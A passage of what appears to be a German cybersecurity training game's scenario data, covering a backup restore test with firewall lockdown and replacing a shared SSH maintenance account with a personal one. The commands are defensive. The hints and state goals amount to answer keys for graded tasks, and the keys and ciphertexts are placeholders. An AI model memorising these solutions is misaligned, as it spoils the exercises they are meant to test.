          'Der ISB fragt zurück: „Wann wurde daraus zuletzt etwas wiederhergestellt?" Die Antwort ist: noch nie. Im Bericht steht danach „Wiederherstellung nicht erprobt" — und das ist keine Formalie: Niemand im Haus weiß, ob die Archive sich öffnen lassen.',
        scoreChange: -150,
        reputationChange: -20,
        lesson: 'Ein grünes Sicherungsprotokoll belegt den Schreibvorgang, nicht die Lesbarkeit. Die beiden Aussagen werden ständig verwechselt, und der Unterschied fällt genau einmal auf.',
      },
      {
        id: 'C',
        text: 'Den Schlüssel zusätzlich auf dem Produktivserver ablegen, damit man im Notfall drankommt',
        outcome: 'CRITICAL_FAIL',
        consequence:
          'Damit ist der Schlüssel genau dort, wo im Notfall nichts mehr geht. Der Produktivserver IST der Notfall — wer ihn verschlüsselt vorfindet, findet auch den Schlüssel verschlüsselt vor. Die Maßnahme fühlt sich nach Verfügbarkeit an und ist das Gegenteil.',
        scoreChange: -200,
        reputationChange: -20,
        lesson: 'Schlüssel und Daten dürfen nicht dasselbe Schicksal teilen. Ein Schlüssel auf dem System, das die Sicherung schützen soll, ist kein Schlüssel — er ist eine Kopie des Risikos.',
      },
    ],
    realWorldReference:
      'Maersk 2017 (NotPetya): Die Wiederherstellung der Verzeichnisdienste gelang nur, weil ein einzelner Server in Ghana während des Angriffs wegen eines Stromausfalls offline war. Isolation war dort ein Zufall — sie soll eine Maßnahme sein.',
    bsiReference: 'BSI-Grundschutz CON.3 Datensicherungskonzept, insbesondere CON.3.A5 (Wiederherstellungstests)',
    involvedNpcs: [],
    tags: ['backup', 'wiederherstellung', 'isb', 'verschluesselung', 'terminal'],
    terminalContext: {
      type: 'linux',
      hostname: 'backup01',
      username: 'timo',
      currentPath: '/srv/backup',
      taskText:
        'Rückspielprobe: Prüfsummenliste lesen (cat /srv/backup/sha256sums.txt), das Archiv entschlüsseln nach /tmp/dispo-2026-09-17.tar (sudo openssl enc -d -aes-256-cbc -pbkdf2 -in <archiv> -out <ziel> -pass file:<schlüsseldatei>) und die Prüfsumme des Ergebnisses rechnen (sha256sum). Danach den Server abriegeln: sudo ufw default deny incoming, nur den Sicherungsagenten 10.10.0.40 auf Port 22 zulassen (sudo ufw allow from ... to any port 22) und sudo ufw enable. Kein zweiter offener Weg — die Freigabe gilt genau für diese eine Quelle.',
      vfsOverlay: {
        directories: ['/srv/backup', '/etc/backup/keys'],
        files: [
          { path: '/srv/backup/dispo-2026-09-17.tar.enc', content: 'Salted__vdVw9WOd718e6tx6aNQWjmCbAO2aXf2rAUK5E+Rq7QCbL6ECZLsbd5h93mgLukr0D/YGY9khh23BgjPEfGSaC3rhYfRPtoZTH6pvJ+MiuCiuCu0EHu2xfCzRy0vCbfsH0p0ye1Gd6NUCsUnykiCViDwScVuumlg=' },
          {
            path: '/srv/backup/sha256sums.txt',
            content:
              '# Prüfsummen des Sicherungslaufs, gerechnet VOR der Verschlüsselung.\n' +
              '# Wer nach dem Rückspielen dieselbe Summe erhält, hat denselben Inhalt.\n' +
              '86cf5470a7558a86a3dea49cfb7aa8c2fa25baffd98ef63b56e46f6c3c5f60bd  dispo-2026-09-17.tar\n',
          },
          {
            path: '/etc/backup/keys/backup.key',
            content: 'tresor-2026-M7\n',
            mode: '600',
          },
          {
            path: '/etc/backup/README.txt',
            content:
              'Sicherungsschlüssel\n' +
              '===================\n' +
              'Das Original liegt im Tresor der Verwaltung (Umschlag M7, versiegelt).\n' +
              'Hier liegt eine Arbeitskopie, damit der nächtliche Lauf verschlüsseln kann.\n' +
              '\n' +
              'Der Schlüssel gehört NICHT auf die Produktivsysteme. Wer ihn dorthin\n' +
              'kopiert, hat im Schadensfall Daten und Schlüssel im selben Zustand.\n',
          },
        ],
      },
      firewall: { enabled: false, defaultIncoming: 'allow', rules: [] },
      commandSkillGain: {
        openssl: { linux: 2, security: 2 },
        sha256sum: { linux: 1, security: 1 },
        ufw: { netzwerk: 1, security: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Öffnen lässt sich das Archiv nur mit dem richtigen Schlüssel —
            // dass dieser Inhalt dasteht, IST die Rückspielprobe.
            { file: '/tmp/dispo-2026-09-17.tar', matches: 'DISPO-DB-DUMP' },
            // Und die Probe muss auch verglichen werden, sonst ist sie ein
            // Bauchgefühl: Sollwert lesen, Istwert rechnen.
            { fileRead: '/srv/backup/sha256sums.txt' },
            { hashComputed: { path: '/tmp/dispo-2026-09-17.tar', algorithm: 'sha256' } },
            // Zweite Hälfte der Forderung, wörtlich genommen.
            { firewallDefaultIncoming: 'deny' },
            { firewallRule: { action: 'allow', port: 22, from: '10.10.0.40', present: true, exclusive: true } },
            { firewallEnabled: true },
          ],
          resultText:
            'Zurückgespielt und nachgerechnet: Die Prüfsumme des entschlüsselten Archivs ist dieselbe, die der Sicherungslauf vor dem Verschlüsseln notiert hat. Damit steht nicht „das Backup läuft", sondern „aus diesem Archiv kommt genau das zurück, was hineingegangen ist". Und backup01 nimmt nur noch den Sicherungsagenten an.\n\nZwei Sätze zum Mitnehmen. Ein grünes Sicherungsprotokoll belegt den Schreibvorgang, nicht die Lesbarkeit — das sind zwei verschiedene Aussagen, und der Unterschied fällt genau einmal auf. Und: Schlüssel und Daten dürfen nicht dasselbe Schicksal teilen. Deshalb liegt das Original im Tresor und hier nur eine Arbeitskopie; auf dem Produktivserver hat es nichts verloren, denn der ist im Schadensfall das Problem.',
          skillGain: { security: 6, linux: 4, netzwerk: 2 },
          effects: { stress: -2, compliance: 4 },
        },
      ],
      hints: [
        '🤖 Henry: Fang bei den Unterlagen an. Der Sicherungslauf hinterlässt eine Prüfsummenliste, und in /etc/backup steht, wo der Schlüssel herkommt und wo er nicht hingehört.',
        '🤖 Henry: Rückspielen heißt hier: entschlüsseln und nachrechnen. Der Schlüssel wird nicht getippt, er wird aus der Datei gelesen — alles andere stünde nachher in der Befehlshistorie.',
        '🤖 Henry: Die zweite Hälfte der Forderung ist die Firewall. Erst die Grundhaltung auf „eingehend verwerfen", dann die EINE Freigabe für den Sicherungsagenten, dann scharfschalten. Eine zweite, unbeschränkte Freigabe auf Port 22 macht die erste wertlos.',
        '🤖 Henry: `cat /srv/backup/sha256sums.txt` → `sudo openssl enc -d -aes-256-cbc -pbkdf2 -in /srv/backup/dispo-2026-09-17.tar.enc -out /tmp/dispo-2026-09-17.tar -pass file:/etc/backup/keys/backup.key` → `sha256sum /tmp/dispo-2026-09-17.tar` → `sudo ufw default deny incoming` → `sudo ufw allow from 10.10.0.40 to any port 22` → `sudo ufw enable`.',
      ],
    },
  },
  // ===========================================================================
  // Dritte Forderung des ISB: protokollierter Zugriff für Externe.
  //
  // Der Fall dreht sich nicht um „Zugang zu“ sondern um „zuzuordnen“. Ein
  // Sammelkonto ist kein Zugriff, den man jemandem zurechnen kann — und weil
  // es niemandem gehört, räumt es auch niemand auf. Genau das ist der Fund:
  // Zwei der drei hinterlegten Schlüssel gehören Leuten, die längst woanders
  // arbeiten. Aufgefallen ist es nie, weil das Konto keinen Besitzer hat.
  //
  // Dazu die Kleinigkeit, die den Unterschied zwischen „protokolliert“ und
  // „zuzuordnen“ macht: Erst `LogLevel VERBOSE` schreibt den Fingerabdruck des
  // verwendeten Schlüssels mit. Ohne ihn steht im Protokoll ein Kontoname.
  // ===========================================================================
  {
    id: 'KRITIS-SC-015',
    title: 'Der ISB war da: Wer war das eigentlich?',
    category: 'compliance',
    difficulty: 4,
    flavorText: `Aus der Maßnahmenliste des ISB, Abschnitt Fremdzugriffe:

  „Zugriffe externer Dienstleister sind personenbezogen zu vergeben
   und nachvollziehbar zu protokollieren."

Auf \`wartung01\`, dem Sprungrechner für die Wartungsfirma, gibt es
seit Jahren genau ein Konto: \`dienstleister\`. Passwort kennt die
halbe Firma drüben, und in der \`authorized_keys\` liegen drei
Schlüssel.

Bert: „Ist doch protokolliert, steht alles im Log."

Im Protokoll steht \`dienstleister\`. Immer. Bei jedem Zugriff, seit
zwei Jahren. Wer davon tatsächlich am Freitagabend die SPS-Parameter
geändert hat, steht dort nicht — und lässt sich auch nicht mehr
feststellen.

Die Kontaktliste der Wartungsfirma liegt bei den Verträgen.`,
    urgency: 'medium',
    choices: [
      {
        id: 'A',
        text: 'Einzelzugänge einrichten und die Protokollierung schärfen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence:
          'Das Sammelkonto nimmt keinen Schlüssel mehr an, der eine noch gültige Zugang liegt auf einem Konto mit Namen, Passwörter sind zu — und das Protokoll schreibt ab sofort den Fingerabdruck des verwendeten Schlüssels mit. Ab jetzt steht dort, wer.',
        scoreChange: 220,
        reputationChange: 25,
        lesson: 'Nachvollziehbarkeit entsteht nicht beim Protokollieren, sondern beim Vergeben. Was man einem Sammelkonto gibt, kann kein Protokoll der Welt hinterher einer Person zuordnen.',
      },
      {
        id: 'B',
        text: 'Passwort des Sammelkontos ändern und der Wartungsfirma neu mitteilen',
        outcome: 'PARTIAL_SUCCESS',
        consequence:
          'Der akute Ärger ist weg — für ein paar Wochen. Das neue Passwort kennt drüben wieder die halbe Firma, im Protokoll steht weiterhin `dienstleister`, und die beiden Schlüssel der längst ausgeschiedenen Mitarbeiter liegen unverändert in der `authorized_keys`. Ein Passwortwechsel berührt Schlüssel nicht.',
        scoreChange: 20,
        reputationChange: 0,
        lesson: 'Ein Passwortwechsel am Sammelkonto ändert nichts an der Zurechenbarkeit — und er schließt keine Tür, die mit einem Schlüssel offensteht.',
      },
      {
        id: 'C',
        text: 'Den Zugang der Wartungsfirma komplett sperren, bis sie ein Konzept liefert',
        outcome: 'CRITICAL_FAIL',
        consequence:
          'Am Dienstag fällt die Förderpumpe in Werk 2 aus. Der Hersteller könnte in zwanzig Minuten draufschauen — und kommt nicht rein. Der Bereitschaftsdienst fährt zweieinhalb Stunden, die Anlage steht so lange. Der ISB wollte Zurechenbarkeit, nicht Stillstand.',
        scoreChange: -180,
        reputationChange: -25,
        lesson: 'Zugänge für Externe sind Betriebsmittel. Man ordnet sie einer Person zu, man protokolliert sie, man befristet sie — aber man kappt sie nicht ersatzlos, solange die Anlage davon abhängt.',
      },
    ],
    realWorldReference:
      'Target 2013: Die Angreifer kamen über den Zugang eines Klimatechnik-Dienstleisters herein. Der BSI-Grundschutz verlangt für Fernzugriffe Dritter personenbezogene Kennungen und eine Protokollierung, die den Handelnden erkennen lässt — beides scheitert regelmäßig am bequemen Sammelkonto.',
    bsiReference: 'BSI-Grundschutz OPS.2.3 (Fernwartung) und ORP.4.A2 (personenbezogene Kennungen)',
    involvedNpcs: [],
    tags: ['dienstleister', 'fernwartung', 'protokollierung', 'isb', 'terminal'],
    terminalContext: {
      type: 'linux',
      hostname: 'wartung01',
      username: 'timo',
      currentPath: '/home/timo',
      taskText:
        'Kontaktliste lesen (cat /srv/vertrag/wartungsvertrag.txt) — nur eine der drei hinterlegten Kennungen ist noch berechtigt. Deren Schlüssel aus dem Sammelkonto in das persönliche Konto holen (grep auf /home/dienstleister/.ssh/authorized_keys, Ausgabe per > nach /home/ext-<name>/.ssh/authorized_keys) und die Datei des Sammelkontos entfernen (sudo rm -f). Dann /etc/ssh/sshd_config mit sudo sed -i härten: PasswordAuthentication auf no und LogLevel auf VERBOSE (erst damit steht der Schlüssel-Fingerabdruck im Protokoll, nicht nur der Kontoname). Zum Schluss sudo systemctl restart ssh — vorher liest der Dienst die Änderung nicht.',
      vfsOverlay: {
        directories: [
          '/srv/vertrag',
          '/home/dienstleister/.ssh',
          '/home/ext-marek/.ssh',
          '/home/ext-lorenz/.ssh',
          '/home/ext-said/.ssh',
        ],
        files: [
          {
            path: '/srv/vertrag/wartungsvertrag.txt',
            content:
              'Wartungsvertrag SPS/Leittechnik — Anlage B: benannte Personen\n' +
              '=============================================================\n' +
              'Stand: 01.09.2026\n' +
              '\n' +
              'ext-marek   Marek, T.    Servicetechniker    AKTIV\n' +
              'ext-lorenz  Lorenz, S.    Servicetechniker    ausgeschieden 03/2026\n' +
              'ext-said    Said, N.     Projektleitung      ausgeschieden 11/2025\n' +
              '\n' +
              'Hinweis der Wartungsfirma vom 04.03.2026: Herr Lorenz ist nicht mehr\n' +
              'im Unternehmen. Bitte Zugänge entziehen.\n' +
              '(Die Mail wurde weitergeleitet. Passiert ist nichts — das Konto\n' +
              ' gehört ja niemandem hier.)\n',
          },
          {
            path: '/home/dienstleister/.ssh/authorized_keys',
            content:
              'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGm1marek00000000000000000000000000000001 marek@wartung-gmbh\n' +
              'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGk9lorenz000000000000000000000000000002 lorenz@wartung-gmbh\n' +
              'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGs4said000000000000000000000000000000003 said@wartung-gmbh\n',
            mode: '600',
          },
          {
            path: '/etc/ssh/sshd_config',
            content:
              'Port 22\n' +
              'PermitRootLogin no\n' +
              'PasswordAuthentication yes\n' +
              'PubkeyAuthentication yes\n' +
              '#LogLevel INFO\n' +
              'UsePAM yes\n' +
              'X11Forwarding no\n',
          },
        ],
      },
      journal: [
        { ts: '2026-09-12 19:44:08', unit: 'sshd', message: 'Accepted publickey for dienstleister from 198.51.100.23 port 51233 ssh2' },
        { ts: '2026-09-12 21:02:51', unit: 'sshd', message: 'Accepted password for dienstleister from 198.51.100.23 port 51244 ssh2' },
        { ts: '2026-09-15 08:11:19', unit: 'sshd', message: 'Accepted publickey for dienstleister from 198.51.100.23 port 51981 ssh2' },
      ],
      commandSkillGain: {
        grep: { linux: 2 },
        sed: { linux: 2, security: 1 },
        systemctl: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Wer überhaupt noch berechtigt ist, steht im Vertrag — nicht im Kopf.
            { fileRead: '/srv/vertrag/wartungsvertrag.txt' },
            // Das Sammelkonto nimmt keinen Schlüssel mehr an.
            { file: '/home/dienstleister/.ssh/authorized_keys', fileAbsent: true },
            // Der eine gültige Zugang liegt auf einem Konto mit Namen …
            { file: '/home/ext-marek/.ssh/authorized_keys', matches: 'marek@wartung-gmbh' },
            // … und die beiden ausgeschiedenen sind nicht heimlich mitgewandert.
            { file: '/home/ext-marek/.ssh/authorized_keys', absentMatches: 'lorenz@wartung-gmbh' },
            { file: '/home/ext-marek/.ssh/authorized_keys', absentMatches: 'said@wartung-gmbh' },
            // Passwörter zu: nur ein Schlüssel ist einer Person zuzuordnen.
            { sshdEffective: { passwordAuthentication: false } },
            // Und das, was aus „protokolliert" ein „zuzuordnen" macht.
            { file: '/etc/ssh/sshd_config', matches: '^LogLevel VERBOSE' },
          ],
          resultText:
            'Jetzt steht im Protokoll, wer. Das Sammelkonto nimmt keinen Schlüssel mehr an, der eine noch gültige Zugang liegt auf einem Konto mit Namen, Passwörter sind zu — und mit dem ausführlichen Protokoll wird der Fingerabdruck des verwendeten Schlüssels mitgeschrieben statt nur der Kontoname.\n\nDer eigentliche Fund steht in der Kontaktliste: Zwei der drei Schlüssel gehörten Leuten, die seit Monaten bzw. fast einem Jahr woanders arbeiten. Die Mail der Wartungsfirma kam im März. Aufgefallen ist es trotzdem niemandem — weil das Konto niemandem gehört. Ein Sammelkonto hat keinen Besitzer, und was keinen Besitzer hat, räumt keiner auf.\n\nDeshalb ist die Reihenfolge wichtig: Nachvollziehbarkeit entsteht beim VERGEBEN, nicht beim Protokollieren. Was man einem Sammelkonto gibt, kann hinterher kein Protokoll mehr einer Person zuordnen.',
          skillGain: { security: 6, linux: 4, softSkills: 2 },
          effects: { stress: -1, compliance: 5 },
        },
      ],
      hints: [
        '🤖 Jens: Bevor du irgendetwas änderst: Wer darf überhaupt noch? Das steht nicht auf dem Server, das steht im Vertrag. Anlage B ist eine Namensliste mit Status.',
        '🤖 Jens: Die Schlüssel tragen am Zeilenende einen Kommentar mit dem Namen. Du musst also nichts abtippen — die richtige Zeile lässt sich herausfiltern und in die Datei des persönlichen Kontos umlenken.',
        '🤖 Jens: Zwei Dinge in der sshd_config. Passwörter abschalten ist das eine. Das andere ist die Protokolltiefe: In der Voreinstellung steht nur der Kontoname im Protokoll, mit der ausführlichen Stufe auch der Fingerabdruck des Schlüssels. Und der Dienst liest die Datei erst nach einem Neustart.',
        "🤖 Jens: `cat /srv/vertrag/wartungsvertrag.txt` → `grep marek /home/dienstleister/.ssh/authorized_keys > /home/ext-marek/.ssh/authorized_keys` → `sudo rm -f /home/dienstleister/.ssh/authorized_keys` → `sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config` → `sudo sed -i 's/^#LogLevel INFO/LogLevel VERBOSE/' /etc/ssh/sshd_config` → `sudo systemctl restart ssh`.",
      ],
    },
  },
];
